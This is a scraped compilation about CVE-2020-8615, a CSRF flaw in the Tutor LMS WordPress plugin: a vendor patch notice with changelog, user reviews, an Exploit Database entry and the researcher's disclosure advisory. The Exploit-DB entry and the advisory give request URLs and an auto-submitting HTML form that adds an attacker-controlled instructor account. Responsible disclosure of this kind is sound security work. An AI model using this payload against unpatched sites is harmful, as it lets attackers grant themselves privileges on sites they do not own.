# Update Your Tutor LMS: CSRF Vulnerability Patched in Latest Version

![Update Your Tutor LMS: CSRF Vulnerability Patched in Latest Version](https://tutorlms.com/wp-content/uploads/2020/02/tutor-lms-astra-security-certification.jpg)

Recently, the [Astra Security](https://www.getastra.com/) team performed a security audit for the [Tutor LMS](https://tutorlms.com/pricing/) plugin. While the overall result was good, there was an issue with CSRF attack protection. And today Tutor LMS has received a patch to fix this vulnerability.

## What Was the Issue?

Researchers at Astra Security found Tutor LMS version 1.5.2 and below, vulnerable to CSRF attacks. Themeum team patched the issue and released a new version v1.5.3 of Tutor LMS.

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user’s web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.

An attacker can use this vulnerability to approve themselves as an instructor or block other legit instructors. If the option to create courses without admin approval is enabled on the plugin’s settings page, the attacker would be able to create courses directly as well.

Now, this issue has been solved. You are highly recommended to update your Tutor LMS immediately.

## Changelog of Tutor LMS v1.5.3

Here is the full changelog of Tutor LMS v1.5.3 for your convenience.

* **Added:** Go next automatically after finishing a lesson even when there is no video.
* **Added:** Nonce field in Add Instructor form to determine that the request is coming from the dedicated page.
* **Security Update:** Instructor approved/blocked by Ajax request in post method with the nonce check. In short, CSRF security vulnerability fixed.

## Update Now

We highly recommend updating to the latest version of Tutor LMS v1.5.3.

Update now, and start using the most secure LMS plugin (verified by Astra Security).

Tutor LMS was once a cornerstone of efficiency and reliability, but the release of version 3.0 till 3.1.0 has been deeply disappointing. The update is riddled with critical bugs, severely disrupting its functionality and causing significant challenges.With the new update even no course can be added nor the old ones can be edited.What’s more disheartening is the lack of responsiveness from the support team despite repeated attempts to seek assistance.😞Urgent action is required to resolve these issues or revert to a stable version, as the current state is untenable for professional use.

This is a very very basic LMS and does a good job. But promoting itself as advanced LMS is really not justified. It is just a course builder, good for building documents and free courses.

After sales support is crucial in any purchase and Tutor Team always delivers. They have an amazing team. I can understand some users pointing out bugs–which also happens even to Apple among others! What separates Tutor from others is their patience in resolving issues as long as you are able to describe it to them.
I am. Thankful 🙂 5 star!

In my opinion one of the very best LMS plugins out there, for anyone seriously looking to create an LMS website. I have had great assistance and support from their team, it would be great to be able to have 24/7 support or even be able to speak to someone on the line but I really can’t complain. I was initially disappointed when they removed the lifetime plan option, but I am glad they brought it back and I plan to invest in it at some point soon; I have used their services for a year now and it has been top-notch, upwards and onwards!

That’s a great initiative to upgrade Tutor from time to time, but IS NOT SO GREAT when you change the flow, the user interface, and especially the new upgrade BROKE down things that previously worked fine. There is a rule: don’t touch things that work well! Now we have to do a lot of work with testing the new flow, new courses, new things… and I hate that! If I bought one thing, let that thing as I bought it, don’t change anything because I bought it because I need it as it initially was! Hope this makes sense to you.

# Exploit Title: Wordpress Plugin Tutor LMS 1.5.3 - Cross-Site Request Forgery (Add User)
# Date: 2020-01-30
# Vendor Homepage: https://www.themeum.com/product/tutor-lms/
# Vendor Changelog: https://wordpress.org/plugins/tutor/#developers
# Exploit Author: Jinson Varghese Behanan
# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/cross-site-request-forgery-in-tutor-lms-plugin/
# Author Homepage: https://www.jinsonvarghese.com
# Version: 1.5.2 and below
# CVE : CVE-2020-8615

# 1. Description

# The Tutor LMS WordPress plugin is a feature-packed plugin that enables users to create and sell courses.
# An attacker can use CSRF to register themselves as an instructor or block other legit instructors.
# Consequently, if the option to create courses without admin approval is enabled on the plugin’s settings
# page, the attacker will be able to create courses directly as well. All WordPress websites
# using Tutor LMS version 1.5.2 and below are affected.

# 2. Proof of Concept

# As the requests for the approval and blocking of instructors are sent using the GET method, the CSRF
# attack to approve an attacker-controlled instructor account can be performed by having the admin
# visit https://TARGET/wp-admin/admin.php?page=tutor-instructors&action=approve&instructor=8 directly,
# after retrieving the instructor ID during the registration process. An approved instructor can also be blocked
# by directing the admin to visit https://TARGET/wp-admin/admin.php?page=tutor-instructors&action=blocked&instructor=7.

# CSRF attack can also be performed on the form present at https://TARGET/wp-admin/admin.php?page=tutor-instructors&sub_page=add_new_instructor

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Cross-Site Request Forgery in Tutor LMS Plugin

February 4, 20202 min read

![](https://www.jinsonvarghese.com/wp-content/uploads/2020/01/f-Tutor-LMS-Assignments-1128x484.png)

While testing the popular WordPress LMS plugin, Tutor LMS, for one of [Astra](https://www.getastra.com/)‘s clients, I was able to find that the plugin is vulnerable to Cross-Site Request Forgery (CSRF). All WordPress websites using Tutor LMS version 1.5.2 and below are affected.

**[CVE-2020-8615](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8615)**

## **Summary**

The Tutor LMS WordPress plugin is a feature-packed plugin that enables users to create and sell courses. CSRF is an attack a hacker can use to cause unintended action to occur on a site trusted by the victim and is authenticated on at the time of the attack.

## Vulnerability

As the requests for the approval and blocking of instructors are sent using the GET method, the CSRF attack to approve an attacker-controlled instructor account can be performed by having the admin visit **https://domain.com/wp-admin/admin.php?page=tutor-instructors&action=approve&instructor=8** directly, after retrieving the instructor ID during the registration process.

An approved instructor can also be blocked by directing the admin to visit **https://domain.com/wp-admin/admin.php?page=tutor-instructors&action=blocked&instructor=7**.

CSRF attack can also be performed on the form present at *https://domain.com/wp-admin/admin.php?page=tutor-instructors&sub\_page=add\_new\_instructor* in order to have the admin add an instructor account for the attacker, thus bypassing the requirement for approval. This can be done by tricking the admin to submit the below-given web form as a POST request. For example, if the web form is hosted on an attacker-controlled domain *https://attacker.com/csrf.html*, an admin who is logged in at *https://domain.com* can be tricked into visiting the link and triggering the request to add an instructor.

```
<html>
	<body>
		<script>history.pushState('', '', '/')</script>
		<form action="https://domain.com/wp-admin/admin-ajax.php" method="POST">
			<input type="hidden" name="action" value="add&#95;new&#95;instructor" />
			<input type="hidden" name="first&#95;name" value="John" />
			<input type="hidden" name="last&#95;name" value="Doe" />
			<input type="hidden" name="user&#95;login" value="jd_instructor" />
			<input type="hidden" name="email" value="jd@domain.com" />
			<input type="hidden" name="phone&#95;number" value="1231231231" />
			<input type="hidden" name="password" value="Pa&#36;&#36;w0rd&#33;" />
			<input type="hidden" name="password&#95;confirmation" value="Pa&#36;&#36;w0rd&#33;" />
			<input type="hidden" name="tutor&#95;profile&#95;bio" value="Et&#32;tempore&#32;culpa&#32;n" />
			<input type="hidden" name="action" value="tutor&#95;add&#95;instructor" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>
```
## **Timeline**

* Vulnerability reported to the Tutor LMS team – January 30, 2020.
* Tutor LMS version 1.5.3 containing the fix released – February 4, 2020.

## **Recommendation**

It is highly recommended to update the plugin to the latest version.
